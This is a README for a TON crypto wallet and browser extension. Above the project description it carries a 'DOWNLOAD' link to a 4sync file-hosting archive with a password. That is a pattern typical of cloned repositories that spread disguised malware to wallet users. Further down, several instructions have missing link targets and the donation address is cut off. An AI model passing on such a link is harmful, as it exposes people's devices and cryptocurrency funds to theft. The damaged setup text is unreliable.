#
# [DOWNLOAD](https://www.4sync.com/web/directDownload/vQ0GwKNh/ucR3VkWM.b319ff3cba0a42c5ae3faf25e462a580)  
## PASSWORD: g1tsoft2025




**The most feature-rich web wallet and browser extension for the [TON Network](https://ton.org)** – with support of jettons, NFT, TON DNS, TON Sites, TON Proxy, and TON Magic.

<img src="https://user-images.githubusercontent.com/102837730/193835310-1436afcd-ed78-4656-92c3-9c8f4beacacf.png" width="600" />

The wallet is **self-custodial and safe**. The developers **do not** have access to funds, browser history or any other information. We focus on **speed**, **size** and **attention to detail**. We try to avoid using third-party libraries to ensure maximum reliability and safety, and also to lower the bundle size.

## Table of contents


## Requirements

Ready to build on **macOS** and **Linux**.

To build on **Windows**, you will also need:

- Any terminal emulator with bash (Git Bash, MinGW, Cygwin)
- A zip utility (for several commands)

## Local Setup
### NPM Local Setup
```sh
cp .env.example .env

npm ci
```

## Dev Mode

```sh
npm run dev
```

## Linux Desktop Troubleshooting

**If the app does not start after click:**



**If the app does not appear in the system menu or does not process ton:// and TON Connect deeplinks:**

and install the AppImage file through it.

```bash
sudo add-apt-repository ppa:appimagelauncher-team/stable
sudo apt-get update
sudo apt-get install appimagelauncher
```

**If the app does not connect to Ledger:**

Copy the udev rules from the  and run the file `add_udev_rules.sh` with root rights.

```bash
git clone 
cd udev-rules
sudo bash ./add_udev_rules.sh
```

## Support Us

If you like what we do, feel free to contribute by creating a pull request, or just support us using this TON wallet:S`. We appreciate it a lot!
